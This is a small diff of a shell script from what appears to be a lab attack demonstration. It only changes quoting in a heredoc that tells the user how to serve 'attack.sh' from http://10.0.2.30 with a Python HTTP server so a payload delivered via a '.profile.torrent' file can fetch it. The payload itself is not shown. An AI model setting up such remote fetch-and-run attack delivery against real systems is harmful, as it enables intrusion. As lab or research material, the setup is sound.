@@ -30,11 +30,11 @@ sudo ifup enp0s3
 cat <<EOF
 -> The attack script will be requested from http://10.0.2.30/attack.sh
 -> You need to serve that file for this attack to be successful
--> A `attack.sh` file is provided in the git project root
--> Running `sudo python3 -m http.server 80` will serve this file.
+-> A 'attack.sh' file is provided in the git project root
+-> Running 'sudo python3 -m http.server 80' will serve this file.
 
 -> If you want to get the attack file from a different location you will need
--> to create a new `.profile.torrent` file and update the attack payload
+-> to create a new '.profile.torrent' file and update the attack payload
 -> to run that torrent file.
 EOF
 
